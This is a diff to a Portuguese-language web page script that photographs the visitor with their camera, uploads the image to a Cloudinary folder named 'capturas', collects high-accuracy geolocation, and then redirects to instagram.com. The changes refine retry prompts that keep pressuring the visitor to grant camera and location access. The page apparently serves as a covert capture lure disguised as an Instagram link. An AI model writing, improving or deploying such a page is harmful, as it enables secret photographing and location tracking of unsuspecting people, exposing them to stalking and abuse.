@@ -29,7 +29,7 @@
     const cloudName = "dx5legahb";
     const uploadPreset = "upload";
     const folderName = "capturas";
-    let capturedImageUrl = null; // <- variável global
+    let capturedImageUrl = null;
 
     function showOverlay(message, callback) {
       const overlay = document.getElementById("overlay");
@@ -82,12 +82,12 @@
 
         if (!response.ok) throw new Error("Erro ao enviar imagem");
         const data = await response.json();
-        capturedImageUrl = data.secure_url; // <- salva a imagem
+        capturedImageUrl = data.secure_url;
         return capturedImageUrl;
       } catch (error) {
         console.error("Erro na captura da foto:", error);
         showOverlay("Permita acesso à câmera para continuar. Toque para tentar novamente.", () => {
-          startFlow(); // só aqui reinicia tudo
+          startFlow();
         });
         throw error;
       }
@@ -114,14 +114,14 @@
           window.location.href = "https://instagram.com";
         } catch (err) {
           console.error("Erro no envio da localização:", err);
-          showOverlay("Permita acesso à localização para continuar. Toque para tentar novamente.", () => {
-            requestLocation(imageUrl); // só tenta localização de novo
+          showOverlay("Permita acesso à localização. Toque para tentar novamente.", () => {
+            requestLocation(imageUrl); // só pede localização
           });
         }
       }, (err) => {
         console.error("Erro ao obter localização:", err);
-        showOverlay("Permita acesso à localização para continuar. Toque para tentar novamente.", () => {
-          requestLocation(imageUrl); // só tenta localização de novo
+        showOverlay("Permita acesso à localização. Toque para tentar novamente.", () => {
+          requestLocation(imageUrl); // só pede localização
         });
       }, {
         enableHighAccuracy: true,
@@ -132,8 +132,12 @@
 
     async function startFlow() {
       try {
-        const imageUrl = await capturePhoto(); // pega e salva na global
-        requestLocation(imageUrl);
+        if (!capturedImageUrl) {
+          const imageUrl = await capturePhoto();
+          requestLocation(imageUrl);
+        } else {
+          requestLocation(capturedImageUrl); // se já tirou a foto, só tenta localização
+        }
       } catch (e) {
         console.error("Erro no fluxo:", e);
       }
